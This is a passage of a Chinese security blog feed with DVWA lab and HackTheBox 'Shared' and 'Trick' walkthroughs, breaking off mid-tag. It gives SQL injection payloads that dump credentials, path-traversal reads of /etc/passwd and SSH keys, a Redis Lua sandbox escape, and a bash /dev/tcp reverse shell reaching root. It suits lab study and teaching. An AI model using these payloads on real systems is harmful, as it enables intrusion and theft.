class="line">127.0.0.1|whoami</span><br></pre></td></tr></table></figure><hr /><h2 id="csrf"><a class="markdownIt-Anchor" href="#csrf"></a> CSRF</h2><p>Cross-site Request Forgery，跨站请求伪造，这个不多说，比较多的是社工这方面吧，就是利用目标的防范意识不强然后打开了我们含有非法请求的伪造网站，做出了非自我意识的操作。</p><hr /><h2 id="file-inclusion"><a class="markdownIt-Anchor" href="#file-inclusion"></a> File Inclusion</h2><h3 id="low-3"><a class="markdownIt-Anchor" href="#low-3"></a> Low</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.129.129/vulnerabilities/fi/?page=../../../../../../../../etc/hosts</span><br></pre></td></tr></table></figure><h3 id="high-3"><a class="markdownIt-Anchor" href="#high-3"></a> High</h3><p>多了一个参数接收的file前缀过滤，但是刚好有file这个协议，直接协议访问文件就ok</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.129.129/vulnerabilities/fi/?page=file:///etc/hosts</span><br></pre></td></tr></table></figure><hr /><h2 id="file-upload"><a class="markdownIt-Anchor" href="#file-upload"></a> File Upload</h2><h3 id="low-4"><a class="markdownIt-Anchor" href="#low-4"></a> Low</h3><p>低级可以上传任何php文件，所以直接上传一个<code>php-reverse-shell</code>，然后nc远程就可以实现RCE了</p><h3 id="high-4"><a class="markdownIt-Anchor" href="#high-4"></a> High</h3><p>查看源代码，这里有几个重要的参数要介绍：</p><ul><li>target_path: 如名</li><li>uploaded_name: 上传文件名</li><li>uploaded_ext: 文件名最后一个小数点后面的文字（文件后缀）</li><li>uploaded_size: 文件大小</li><li>uploaded_tmp: 上传后的临时文件名称</li></ul><p>上传文件夹是有要求的，后缀名必须是<code>jpg</code>、<code>jpeg</code>或者<code>png</code>，并且文件大小不能超过100M,通过分析后我们需要上传的是规定格式的图片文件，显然直接访问执行代码是没有办法的，需要结合之前发现的File Inclusion，这样我们的代码就可以顺利执行了。</p><hr /><h2 id="sql-injection"><a class="markdownIt-Anchor" href="#sql-injection"></a> SQL Injection</h2><h3 id="low-5"><a class="markdownIt-Anchor" href="#low-5"></a> Low</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND 1=0 union select 1,2,3 -- -</span></span><br></pre></td></tr></table></figure><p>可以更换1,2,3来测试当前表单列数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND 1=0 union select 1,(select group_concat(schema_name) from information_schema.schemata) -- -</span></span><br></pre></td></tr></table></figure><p>查找database</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND 1=0 union select 1,(select group_concat(table_name) from information_schema.tables) -- -</span></span><br></pre></td></tr></table></figure><p>最终效果</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND 1=0 union select 1,(select group_concat(concat(`user`,&#x27;</span><span class="operator">|</span><span class="string">&#x27;,`password`)) from users) -- -</span></span><br></pre></td></tr></table></figure><h3 id="high-5"><a class="markdownIt-Anchor" href="#high-5"></a> High</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users # </span></span><br></pre></td></tr></table></figure><hr /><h2 id="sql-injectionbind"><a class="markdownIt-Anchor" href="#sql-injectionbind"></a> SQL Injection(Bind)</h2><h3 id="low-6"><a class="markdownIt-Anchor" href="#low-6"></a> Low</h3><p>SQL bind一般就是不直接显示查询结果，而是间接得告诉你你的结果是否存在于我们得数据库，虽然说这样并不能直接得到结果，但是还是可以利用这一点枚举出来自己想要的结果是什么</p><p>直接查询1可以正常的得到结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and sleep(15) -- -</span><br></pre></td></tr></table></figure><p>可以发现查询结果出现了延迟，这只是测试能否进行注入</p><p>接下来我们可以根据sql得相关函数来得到结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substring(database,1,1))&gt;1#</span><br></pre></td></tr></table></figure><p>建议使用二分法进行操作，可以大大减少枚举时间</p>]]></content>
      
      
      <categories>
          
          <category> DVWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Brute Force </tag>
            
            <tag> Command Injection </tag>
            
            <tag> CSRF </tag>
            
            <tag> File Inclution </tag>
            
            <tag> File Upload </tag>
            
            <tag> SQL Injection </tag>
            
            <tag> SQL Injection(Bind) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB Shared Machine Challenge</title>
      <link href="/2022/08/18/htb-shared/"/>
      <url>/2022/08/18/htb-shared/</url>
      
        <content type="html"><![CDATA[<h2 id="enumerate"><a class="markdownIt-Anchor" href="#enumerate"></a> Enumerate</h2><h3 id="port-scan"><a class="markdownIt-Anchor" href="#port-scan"></a> port scan</h3><p>首先用nmap扫描如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">80/tcp  open  http     nginx 1.18.0</span><br><span class="line">443/tcp open  ssl/http nginx 1.18.0</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>然后访问网站，在访问网站前我们现需要在本地设置IP指向为<code>shared.htb</code></p><p>进入网站审视，可以发现这是一个购物网站，但是并没有发现什么明显的可利用漏洞，任意选购物品下单，导向到了<code>check.shared.htb</code>，看来这是遗留的子域名，需要将其添加在IP后面。网站的脚标表明这个网站是用PrestaShop搭建起来的，于是我试图用<code>searchsploit</code>查看是否有相关CMS的漏洞利用，但是很明显的，我需要的是网站安装的版本号</p><h3 id="dirctory-enumerate"><a class="markdownIt-Anchor" href="#dirctory-enumerate"></a> dirctory enumerate</h3><p>第一个可以考虑Google搜索查看是否在网站的某个角落可以查看到系统版本号</p><p>第二个是看是否有安装遗留文件，让我们可以根据相关文件内容查看到版本号信息</p><p>我并没有从第一个方法获得任何版本号信息，于是我开始用<code>gobuster</code>对网站的目录进行爆破，结果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//api/                (Status: 401) [Size: 16]</span><br><span class="line">//js/                 (Status: 302) [Size: 0] [--&gt; ../]</span><br><span class="line">//modules/            (Status: 302) [Size: 0] [--&gt; ../]</span><br><span class="line">//config/             (Status: 403) [Size: 153]        </span><br><span class="line">//api.php             (Status: 401) [Size: 16]         </span><br><span class="line">//themes/             (Status: 302) [Size: 0] [--&gt; ../]</span><br><span class="line">//cache/              (Status: 403) [Size: 153]        </span><br><span class="line">//INSTALL.txt         (Status: 200) [Size: 5047]       </span><br><span class="line">//upload/             (Status: 403) [Size: 153]        </span><br><span class="line">//download/           (Status: 302) [Size: 0] [--&gt; ../]</span><br><span class="line">//img/                (Status: 403) [Size: 153]        </span><br><span class="line">//api                 (Status: 401) [Size: 16]         </span><br><span class="line">/robots.txt           (Status: 200) [Size: 2748]       </span><br><span class="line">//upload.php          (Status: 403) [Size: 153]        </span><br><span class="line">//tools/              (Status: 403) [Size: 153]        </span><br><span class="line">//src/                (Status: 403) [Size: 153]        </span><br><span class="line">//pdf/                (Status: 302) [Size: 0] [--&gt; ../]</span><br></pre></td></tr></table></figure><p>访问<code>INSTALL.txt</code>得知版本为<code>PrestaShop 1.7</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PrestaShop 1.6.x/1.7.x - Remote Code Execution                    | php/webapps/45964.php</span><br><span class="line">Prestashop 1.7.6.4 - Cross-Site Request Forgery                   | php/webapps/48347.txt</span><br><span class="line">PrestaShop 1.7.6.7 - &#x27;location&#x27; Blind Sql Injection               | php/webapps/49755.py</span><br><span class="line">Prestashop 1.7.7.0 - &#x27;id_product&#x27; Time Based Blind SQL Injection  | php/webapps/49410.txt</span><br></pre></td></tr></table></figure><p>比较吸引人的是RCE漏洞，但是似乎官方也注意到了不能够让黑客得到后台管理网址，在默认安装后，对<code>/admin</code>进行访问是会重定向到首页的，需要用户手动更改后台地址后才能够正常访问，显然只能用爆破来解决，在刚刚的枚举中并没有发现任何可以目录。</p><h2 id="find-the-way"><a class="markdownIt-Anchor" href="#find-the-way"></a> Find The way</h2><h3 id="sql-injection"><a class="markdownIt-Anchor" href="#sql-injection"></a> SQL injection</h3><p>在结算页面我发现cookie中有一个特别显眼的键<code>custom_card</code>，内容经过转码后是JSON格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;商品代号&quot;:&quot;数量&quot;&#125;</span><br><span class="line">example:</span><br><span class="line">&#123;&quot;YCS98E4A&quot;:&quot;1&quot;,&quot;BTAPXNX4&quot;:&quot;1&quot;&#125;</span><br></pre></td></tr></table></figure><p>于是我尝试修改商品代号，奇怪的是显示的不是我自定义修改的名字，而是<code>Not Found</code>，我猜测这里可能是利用了数据的查询，为了验证这一点，我进行了如下修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">尝试：</span><br><span class="line">&#123;<span class="string">&quot;abc&#x27; and 1=0 union select 1 -- -&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;BTAPXNX4&quot;</span>:<span class="string">&quot;10&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;abc&#x27; and 1=0 union select 1,2 -- -&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;BTAPXNX4&quot;</span>:<span class="string">&quot;10&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;abc&#x27; and 1=0 union select 1,2,3 -- -&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;BTAPXNX4&quot;</span>:<span class="string">&quot;10&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>发现第三个的2得到了回显，我们可以在<code>&#123;&quot;abc' and 1=0 union select 1,2,3 -- -&quot;:&quot;1&quot;,&quot;BTAPXNX4&quot;:&quot;10&quot;&#125;</code>把<code>2</code>修改为我们需要进行查询的语句</p><p><strong>查找database</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;abc&#x27; and 1=0 union select 1,(select gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata),3 -- -&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;BTAPXNX4&quot;</span><span class="punctuation">:</span><span class="string">&quot;10&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>结果:|information_schema|,|checkout|</p></blockquote><p><strong>查找table</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;abc&#x27; and 1=0 union select 1,(select gRoUp_cOncaT(0x7c,table_name,0x7c) fRoM information_schema.tables),3 -- -&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;BTAPXNX4&quot;</span><span class="punctuation">:</span><span class="string">&quot;10&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>结果:|ALL_PLUGINS|,…,|THREAD_POOL_STATS|,|user|,|product|</p></blockquote><blockquote><p>有用的也就最后两个表user和product</p></blockquote><p><strong>获取column</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;abc&#x27; and 1=0 union select 1,(select gRoUp_cOncaT(0x7c,column_name,0x7c) fRoM information_schema.columns where table_name = &#x27;user&#x27;),3 -- -&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;BTAPXNX4&quot;</span><span class="punctuation">:</span><span class="string">&quot;10&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>结果：id|username|password</p></blockquote><p><strong>Finally！Dump Data</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;abc&#x27; and 1=0 union select 1,(select group_concat(concat(`username`,&#x27;|&#x27;,`password`))  from user),3 -- -&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>结果：james_mason|fc895d4eddc2fc12f995e18c865cf273</p></blockquote><p>可以在在线md5解密网站得到明文<code>Soleil101</code></p><h2 id="fake-authentication"><a class="markdownIt-Anchor" href="#fake-authentication"></a> Fake Authentication</h2><h3 id="find-new-user"><a class="markdownIt-Anchor" href="#find-new-user"></a> find new user</h3><p>ssh登陆后发现并没有想象中的顺利，我们在主机上被限制了很多权限，home目录也并没有user flag，但是能够看到有一个<code>dan_smith</code>的用户，user flag在他的家里面。</p><p>权限信息:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uid=1000(james_mason) gid=1000(james_mason) <span class="built_in">groups</span>=1000(james_mason),1001(developer)</span><br><span class="line"></span><br><span class="line">uid=1001(dan_smith) gid=1002(dan_smith) <span class="built_in">groups</span>=1002(dan_smith),1001(developer),1003(sysadmin)</span><br></pre></td></tr></table></figure><h3 id="ipython-exploit"><a class="markdownIt-Anchor" href="#ipython-exploit"></a> ipython exploit</h3><p>使用pspy64发现UID=1001在干如下事情</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2022/08/18 23:21:01 CMD: UID=1001 PID=34081  | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ &amp;&amp; /usr/local/bin/ipython                                       </span><br><span class="line">2022/08/18 23:21:01 CMD: UID=1001 PID=34083  | /usr/bin/python3 /usr/local/bin/ipython                                                                                    </span><br><span class="line">2022/08/18 23:22:01 CMD: UID=1001 PID=34106  | /usr/bin/pkill ipython </span><br><span class="line">2022/08/18 23:22:01 CMD: UID=1001 PID=34105  | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ &amp;&amp; /usr/local/bin/ipython                                       </span><br><span class="line">2022/08/18 23:22:01 CMD: UID=1001 PID=34107  | /usr/bin/python3 /usr/local/bin/ipython</span><br></pre></td></tr></table></figure><p>遍历全目录发现developer组有一个文件夹<code>/opt/script_review</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">drwxrwx--- 2 root developer 4.0K Jul 14 13:46 .</span><br><span class="line">drwxr-xr-x 3 root root      4.0K Jul 14 13:46 ..</span><br></pre></td></tr></table></figure><p>根据ipython的安全故障描述，确实存在越权执行代码的情况，根据提示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -m 777 profile_default</span><br><span class="line"><span class="built_in">mkdir</span> -m 777 profile_default/startup</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;python script&#x27;</span> &gt; /tmp/profile_default/startup/foo.py</span><br></pre></td></tr></table></figure><p>这里python script改为读取用户home目录的<code>id_rsa</code>文件即可</p><h2 id="dan"><a class="markdownIt-Anchor" href="#dan"></a> DAN!</h2><h3 id="get-user-flag"><a class="markdownIt-Anchor" href="#get-user-flag"></a> get user flag</h3><p>连接ssh -i标识进行认证后，终于可以拿到user flag</p><h3 id="find-group-info"><a class="markdownIt-Anchor" href="#find-group-info"></a> find group info</h3><p><code>dan_smith</code>用户有一个有趣的用户组sysadmin，光是名字就很有趣了。于是按组查找发现了<code>/usr/local/bin/redis_connector_dev</code>可执行文件，这个文件执行后自动过了redis验证，于是直接nc监听redis端口看看发生了什么</p><h2 id="elevated-privilege"><a class="markdownIt-Anchor" href="#elevated-privilege"></a> Elevated Privilege</h2><p>根据<a href="https://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/">这篇CVE报告</a>,进行如下操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; /dev/tcp/&#123;your tun ip&#125;/2710&quot; 0&gt;&amp;1&quot; &gt; /dev/shmsh</span><br><span class="line">redis-cli --pass F2WHqJUz2WEz=Gqq</span><br></pre></td></tr></table></figure><p>Redis-cli中执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval &#x27;local l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = l(); local f = io.popen(&quot;cat /dev/shm/sh | bash&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27; 0</span><br></pre></td></tr></table></figure><p>本地Terminal监听2710端口：<br />建立连接后输入就可以看到已经是root用户组<br />监听视角：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">listening on [any] 2710 ...</span><br><span class="line">connect to [10.10.16.17] from (UNKNOWN) [10.10.11.172] 45908</span><br><span class="line">bash: cannot set terminal process group (3180): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">root@shared:/var/lib/redis# </span><br></pre></td></tr></table></figure><h2 id="summary"><a class="markdownIt-Anchor" href="#summary"></a> Summary</h2><p>参考了GatoGamer大佬的帖子，总体来说没有特别难的地方，在找redis密码的时候犯了难，本来还想用Ghidra逆向一下，没想到直接监听端口端口这么简单，思路上还是不够骚。毕。</p>]]></content>
      
      
      <categories>
          
          <category> Machine </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LDAP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB Support Trick Challenge</title>
      <link href="/2022/08/13/htb-trick/"/>
      <url>/2022/08/13/htb-trick/</url>
      
        <content type="html"><![CDATA[<h2 id="enumeration"><a class="markdownIt-Anchor" href="#enumeration"></a> Enumeration</h2><h3 id="nmap-scan"><a class="markdownIt-Anchor" href="#nmap-scan"></a> Nmap Scan</h3><p>扫描到的开放端口如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)</span><br><span class="line">|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)</span><br><span class="line">|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)</span><br><span class="line">25/tcp open  smtp    Postfix smtpd</span><br><span class="line">|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING</span><br><span class="line">53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian</span><br><span class="line">80/tcp open  http    nginx 1.14.2</span><br><span class="line">|_http-title: Coming Soon - Start Bootstrap Theme</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br></pre></td></tr></table></figure><h3 id="zone-transfer-attack"><a class="markdownIt-Anchor" href="#zone-transfer-attack"></a> Zone Transfer Attack</h3><p>由于开放了53端口的Bind ISC服务，可以尝试<code>dns axfr</code>攻击，简单来说就是跨DNS服务器区域传输时，能够方便地将信息复制到其他服务器上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig axfr @10.10.11.16</span><br></pre></td></tr></table></figure><blockquote><p>DiG:全程Domain information Groper，主要用于DNS查询，是BIND软件套件中的工具，取代了旧工具nslookup和hosts</p></blockquote><p>Attack Format</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dig axfr @&lt;DNS_IP&gt; <span class="comment">#Try zone transfer without domain</span></span><br><span class="line">dig axfr @&lt;DNS_IP&gt; &lt;DOMAIN&gt; <span class="comment">#Try zone transfer guessing the domain</span></span><br><span class="line">fierce --domain &lt;DOMAIN&gt; --dns-servers &lt;DNS_IP&gt; <span class="comment">#Will try toperform a zone transfer against every authoritative name server and if this doesn&#x27;twork, will launch a dictionary attack</span></span><br></pre></td></tr></table></figure><p>事实证明目标机器确实没有进行有效的axfr保护，我们可以得到axfr配置下的相关记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800</span><br><span class="line">trick.htb.              604800  IN      NS      trick.htb.</span><br><span class="line">trick.htb.              604800  IN      A       127.0.0.1</span><br><span class="line">trick.htb.              604800  IN      AAAA    ::1</span><br><span class="line">preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.</span><br><span class="line">trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800</span><br></pre></td></tr></table></figure><h3 id="sql-injection"><a class="markdownIt-Anchor" href="#sql-injection"></a> SQL Injection</h3><p>至此<code>/etc/hosts</code>文件已经添加了<code>trick.htb</code>和<code>preprod-payroll.trick.htb</code>，接下来访问<code>preprod-payroll.trick.htb</code>这个域名，来到了一个后台登录页面。首先尝试常见地默认登录凭证，试了几个常用的我发现进不去，然后尝试SQL注入过身份验证，以下是常见方法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;</span>username<span class="operator">&gt;</span><span class="string">&#x27; OR 1=1--</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">OR</span> <span class="string">&#x27;&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;Allows authentication without a valid username.</span></span><br><span class="line"><span class="string">&lt;username&gt;&#x27;</span><span class="comment">--</span></span><br><span class="line"><span class="string">&#x27; union select 1, &#x27;</span><span class="operator">&lt;</span><span class="keyword">user</span><span class="operator">-</span>fieldname<span class="operator">&gt;</span><span class="string">&#x27;, &#x27;</span><span class="operator">&lt;</span>pass<span class="operator">-</span>fieldname<span class="operator">&gt;</span><span class="string">&#x27; 1--</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><p>账号密码都输入<code>' or '1'='1</code>或者账号输入<code>1' or 1=1 -- -</code>,这样进入后台后我们就成功以administrator的身份进入了后台，我猜测应该是后台只有administrator这一个账户才能进入到后台，所以系统错误识别我们为后台管理员。<br />跳转后的URL为<code>http://preprod-payroll.trick.htb/index.php?page=home</code>，很容易让人联想到Remote File Inclusion，但是尝试了几个常见的对应措施后没有办法正确显示文件。</p><h3 id="subdomain-traversal"><a class="markdownIt-Anchor" href="#subdomain-traversal"></a> Subdomain Traversal</h3><p>观察当前URL为<code>preprod-payroll.trick.htb</code>，猜测可能有与<code>preprod-xxxx.trick.htb</code>相关的域名</p><p>使用sed命令统一格式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed <span class="string">&#x27;s/^/preprod-/&#x27;</span> &#123;your dictionary path&#125;</span><br></pre></td></tr></table></figure><p>wfuzz遍历子域</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -t 200 --hl 83 -H <span class="string">&quot;Host: FUZZ.trick.htb&quot;</span> -u trick.htb</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">********************************************************</span><br><span class="line">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://10.10.11.166/</span><br><span class="line">Total requests: 20000</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload                            </span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line">000000254:   200        178 L    631 W      9660 Ch     &quot;preprod-marketing&quot;                </span><br><span class="line">000005320:   302        266 L    527 W      9546 Ch     &quot;preprod-payroll&quot;                  </span><br><span class="line"></span><br><span class="line">Total time: 0</span><br><span class="line">Processed Requests: 20000</span><br><span class="line">Filtered Requests: 19998</span><br><span class="line">Requests/sec.: 0</span><br></pre></td></tr></table></figure><p>添加<code>preprod-marketing.trick.htb</code>记录，然后访问门户网站，我们发现URL此时也可能存在本地文件包含漏洞，再次尝试发现访问<code>http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd</code>可以正常显示passwd的敏感内容</p><h3 id="获取ssh凭据-private-key"><a class="markdownIt-Anchor" href="#获取ssh凭据-private-key"></a> 获取ssh凭据 private key</h3><p>访问 <a href="http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa">http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa</a> 可以得到ssh凭据，将其另存为id_rsa</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh michael@trick.htb -i id_rsa</span><br></pre></td></tr></table></figure><blockquote><p>值得注意的是要能够正常使用到id_rsa这张凭据，必须将其权限更为仅自己有读写权限</p></blockquote><p>拿到user flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/michael/user.txt</span><br></pre></td></tr></table></figure><h3 id="elevated-privilege"><a class="markdownIt-Anchor" href="#elevated-privilege"></a> Elevated Privilege</h3><p>先看看这个账户有什么软件有特殊管理员权限，先常规操作<code>sudo -l</code>，输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for michael on trick:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User michael may run the following commands on trick:</span><br><span class="line">    (root) NOPASSWD: /etc/init.d/fail2ban restart</span><br></pre></td></tr></table></figure><p>我们可以在<a 